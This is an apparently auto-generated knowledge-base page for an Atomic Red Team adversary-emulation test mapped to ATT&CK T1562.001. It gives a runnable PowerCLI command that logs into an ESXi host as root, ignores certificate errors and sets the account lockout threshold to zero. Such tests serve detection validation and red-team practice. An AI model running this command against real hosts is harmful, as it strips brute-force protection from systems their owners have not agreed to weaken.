---
atomic_guid: "091a6290-cd29-41cb-81ea-b12f133c66cb"
title: "ESXi - Disable Account Lockout Policy via PowerCLI"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "091a6290-cd29-41cb-81ea-b12f133c66cb"
  - "ESXi - Disable Account Lockout Policy via PowerCLI"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# ESXi - Disable Account Lockout Policy via PowerCLI

An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.

## Metadata

- Atomic GUID: 091a6290-cd29-41cb-81ea-b12f133c66cb
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: linux
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Input Arguments

### vm_host

- description: Specify the host name of the ESXi Server
- type: string
- default: atomic.local

### vm_pass

- description: Specify the privilege user password on ESXi Server
- type: string
- default: pass

### vm_user

- description: Specify the privilege user account on ESXi Server
- type: string
- default: root

## Dependencies

Check if VMWARE PowerCLI PowerShell Module is installed.

### Prerequisite Check

```powershell
$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable
if (-not $RequiredModule) {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name VMware.PowerCLI -Confirm:$false
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
Disconnect-VIServer -Confirm:$false
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
